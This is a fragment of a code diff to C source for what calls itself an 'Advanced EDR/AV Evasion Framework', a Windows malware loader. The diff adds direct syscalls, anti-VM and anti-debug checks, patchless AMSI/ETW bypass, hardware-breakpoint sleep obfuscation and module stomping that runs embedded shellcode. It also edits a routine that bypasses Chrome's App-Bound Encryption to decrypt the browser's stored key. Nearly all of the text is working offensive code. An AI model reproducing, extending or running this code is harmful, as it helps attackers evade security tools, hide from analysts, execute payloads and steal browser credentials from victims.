     HANDLE hThread = GetCurrentThread();
-    if (!NtGetContextThread(hThread, &ctx)) {
+    if (!NtGetContextThreadSyscall(hThread, &ctx)) {
         ctx.Dr0 = 0;
         ctx.Dr1 = 0;
         ctx.Dr2 = 0;
         ctx.Dr3 = 0;
         ctx.Dr7 = 0;
-        return NtSetContextThread(hThread, &ctx);
+        return NtSetContextThreadSyscall(hThread, &ctx);
     }
 
     return false;
@@ -841,7 +996,7 @@ static bool CheckDebuggerPresent() {
     PROCESS_BASIC_INFORMATION pbi = { 0 };
     ULONG returnLength = 0;
 
-    NTSTATUS status = NtQueryInformationProcess(hProcess,
+    NTSTATUS status = NtQueryInformationProcessSyscall(hProcess,
         ProcessBasicInformation, &pbi, sizeof(pbi), &returnLength);
 
     if (NT_SUCCESS(status) && pbi.PebBaseAddress) {
@@ -850,24 +1005,11 @@ static bool CheckDebuggerPresent() {
         }
     }
 
-    DWORD64 ntdll = (DWORD64)GetModuleHandleA("ntdll.dll");
-    if (ntdll) {
-        PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)ntdll;
-        PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(ntdll + pDos->e_lfanew);
-        PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
-
-        for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
-            if (strcmp((char*)pSection[i].Name, ".rdata") == 0) {
-                DWORD64 offset = pSection[i].VirtualAddress;
-                while (offset < pSection[i].VirtualAddress + pSection[i].Misc.VirtualSize) {
-                    if (*(DWORD*)(ntdll + offset) == 0x00000000) {
-                        offset += 4;
-                        continue;
-                    }
-                    offset++;
-                }
-                break;
-            }
+    CONTEXT ctx = { 0 };
+    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+    if (NtGetContextThreadSyscall(GetCurrentThread(), &ctx)) {
+        if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) {
+            return true;
         }
     }
 
@@ -881,16 +1023,12 @@ static bool PerformAntiVMChecks() {
     if (CheckVMRegistry()) return false;
     if (CheckMACAddress()) return false;
     if (CheckTimingAnomaly()) return false;
-    if (CheckDebuggerPresent()) return false;
-
-    CONTEXT ctx = { 0 };
-    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
-    if (GetThreadContext(GetCurrentThread(), &ctx)) {
-        if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) {
-            return false;
-        }
-    }
 #endif
+
+#if CONFIG_ENABLE_ANTI_DEBUG
+    if (CheckDebuggerPresent()) return false;
+#endif
+
     return true;
 }
 
@@ -913,9 +1051,9 @@ static bool BypassChromeAppBoundEncryption() {
 
     if (wcsstr(chromeDir, L"Google\\Chrome\\Application") == NULL) {
         wchar_t targetDir[MAX_PATH];
-        wsprintfW(targetDir, L"C:\\Program Files\\Google\\Chrome\\Application\\%s", 
+        wsprintfW(targetDir, L"C:\\Program Files\\Google\\Chrome\\Application\\%s",
             wcsrchr(chromePath, L'\\') + 1);
-        
+
         if (!CopyFileW(chromePath, targetDir, FALSE)) {
             wsprintfW(targetDir, L"C:\\Program Files (x86)\\Google\\Chrome\\Application\\%s",
                 wcsrchr(chromePath, L'\\') + 1);
@@ -1008,7 +1146,6 @@ static bool BypassChromeAppBoundEncryption() {
     BYTE decryptedKey[4096] = { 0 };
     DWORD decryptedSize = 4096;
 
-    typedef HRESULT(WINAPI* DecryptFunc)(PVOID, const wchar_t*, int, BYTE*, DWORD*);
     DecryptFunc pDecrypt = (DecryptFunc)GetProcAddress((HMODULE)pElevator, "Decrypt");
 
     if (pDecrypt) {
@@ -1119,11 +1256,11 @@ int main(int argc, char* argv[]) {
         targetPid = atoi(argv[1]);
     }
 
-    printf("Advanced EDR/AV Evasion Framework\n");
-    printf("================================\n\n");
+    printf("Advanced EDR/AV Evasion Framework - Modern Techniques\n");
+    printf("==================================================\n\n");
 
     if (!PerformAntiVMChecks()) {
-        printf("[!] VM/Sandbox/ Debugger detected. Exiting.\n");
+        printf("[!] VM/Sandbox/Debugger detected. Exiting.\n");
         return 0;
     }
     printf("[+] Anti-VM checks passed.\n");
@@ -1132,7 +1269,8 @@ int main(int argc, char* argv[]) {
         printf("[!] Failed to initialize syscalls.\n");
         return 1;
     }
-    printf("[+] Syscalls initialized. (%d syscalls resolved)\n", g_syscallCount);
+    printf("[+] Syscalls initialized. (%d syscalls resolved, %d gadgets)\n",
+        g_syscallCount, g_syscallGadgetCount);
 
 #if CONFIG_ENABLE_NTDLL_UNHOOKING
     if (UnhookNtdll()) {
@@ -1142,26 +1280,17 @@ int main(int argc, char* argv[]) {
     }
 #endif
 
-#if CONFIG_ENABLE_ETW_PATCHING
-    if (PatchETW()) {
-        printf("[+] ETW patched successfully.\n");
+#if CONFIG_ENABLE_PATCHLESS_AMSI_ETW
+    if (PatchlessAmsiEtwBypass()) {
+        printf("[+] Patchless AMSI/ETW bypass configured.\n");
     } else {
-        printf("[!] ETW patching failed.\n");
-    }
-#endif
-
-#if CONFIG_ENABLE_AMSI_BYPASS
-    if (PatchAMSI()) {
-        printf("[+] AMSI bypassed successfully.\n");
-    } else {
-        printf("[!] AMSI bypass failed.\n");
+        printf("[!] Patchless AMSI/ETW bypass failed.\n");
     }
 #endif
 
 #if CONFIG_ENABLE_HWBP_CLEARING
-    if (ClearHardwareBreakpoints()) {
-        printf("[+] Hardware breakpoints cleared.\n");
-    }
+    ClearHardwareBreakpoints();
+    printf("[+] Hardware breakpoints cleared.\n");
 #endif
 
 #if CONFIG_ENABLE_CHROME_ABE_BYPASS
@@ -1176,8 +1305,8 @@ int main(int argc, char* argv[]) {
     SIZE_T payloadSize = sizeof(g_shellcode);
 
 #if CONFIG_ENABLE_MODULE_STOMPING
-    if (ModuleStomping(payload, payloadSize)) {
-        printf("[+] Module stomping successful.\n");
+    if (ModuleStompingWithPdata(payload, payloadSize)) {
+        printf("[+] Module stomping with .pdata successful.\n");
         printf("[+] Payload executed via module stomping.\n");
         return 0;
     }
@@ -1191,8 +1320,11 @@ int main(int argc, char* argv[]) {
         printf("[!] Payload injection failed.\n");
     }
 
-#if CONFIG_ENABLE_SLEEP_OBFUSCATION
-    SleepObfuscation(payload, payloadSize, 5000);
+#if CONFIG_ENABLE_HWBP_SLEEP
+    HwbpSleepObfuscation(payload, payloadSize, 5000);
+    printf("[+] HWBP sleep obfuscation completed.\n");
+#elif CONFIG_ENABLE_SLEEP_OBFUSCATION
+    HwbpSleepObfuscation(payload, payloadSize, 5000);
     printf("[+] Sleep obfuscation completed.\n");
 #endif
 
